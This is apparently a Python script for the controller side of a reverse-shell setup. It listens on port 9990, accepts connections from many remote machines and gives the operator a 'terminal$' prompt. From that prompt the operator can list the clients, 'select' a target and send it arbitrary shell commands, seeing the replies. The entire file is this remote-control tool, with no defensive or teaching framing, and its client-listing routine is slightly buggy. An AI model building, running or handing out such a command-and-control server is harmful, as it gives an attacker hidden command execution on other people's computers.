import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_conn = []
all_add = []

#create a socket
def create_socket():
    try:

        global host
        global port
        global s
        host = ""
        port = 9990
        s = socket.socket()
    except socket.error as msg:
        print("socket no create " +str(msg))

# binding the socket and listening for connections
def bind_socket():
    try:

        global host
        global port
        global s

        print("binding the port " + str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("socket binding error " + str(msg) + "\n" + 'retrying')    
        bind_socket()

# making a connection with a single client      
'''def socket_accept():
    conn, address= s.accept() 
    print('conection is maked ' + ' ip ' + address[0] + ' port ' + str(address[1])) 
    send_command(conn)
    conn.close()

# send some command
def send_command(conn):
    while True :
        ter = input()
        if ter == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(ter)) > 0 :
            conn.send(str.encode(ter))
            client_res = str(conn.recv(1024), "utf-8") 
            print(client_res, end ="" ) 

def main():
    create_socket()
    bind_socket()
    socket_accept()

'''
# handling multiple client
#closing pervious connections

def accept_conn():
    for c in all_conn:
        c.close()
    
    del all_conn[:]
    del all_add[:]

    while True:
        try :
            conn, address = s.accept()
            s.setblocking(1) # prevents timeout 
            
            all_conn.append(conn)
            all_add.append(address)

            print("connectioons has been made : " + address[0])
        except:
            print("error accepting connections") 

# 2nd thered function 
#interactive prompt
# client ID and name
def start_ter():
    while True:
        ter = input('terminal$ ')
        if ter == 'list':
            list_conn()
        elif 'select' in ter:
            conn = get_target(ter)
            if conn is not None:
                send_target_comm(conn)
       
        else:
            print("command no found") 

# display alll the connections

def list_conn():
    results = ''

    for i,conn in enumerate(all_conn):
        try:
            conn.send(str.encode(' '))
            conn.recv(20651)
        except:
            del all_conn[i]
            del all_add[i]
            continue    

        results = str(i) + '  ' + str(all_add[i][0] )+ '  ' +str(all_add[i][1]) + '\n'

    print("---- Clients----"+ '\n' + results)        
    
# selecting target
def get_target(ter):
    try:
        target = ter.replace('select ','')
        target = int(target)
        conn = all_conn[target]
        print('you r connected : '+ str(all_add[target][0]))
        print(str(all_add[target][0]) + '$', end="")
        return conn
    except:
        print('selection is not correct')
        return None    

# send some command
def send_target_comm(conn):
    while True :
        try:
            ter = input()
            if ter == 'quit':
                break
            if len(str.encode(ter)) > 0 :
                conn.send(str.encode(ter))
                client_res = str(conn.recv(20651), "utf-8") 
                print(client_res, end ="" ) 
        except:
            print('error sending commands')
            break

# worker for threds
def create_work():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

#do next job
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_conn()
        if x == 2 :
            start_ter()  

        queue.task_done()          


def create_job():
    for x in JOB_NUMBER:
        queue.put(x)
    
    queue.join()

def main():
    create_work()
    create_job()      

main()    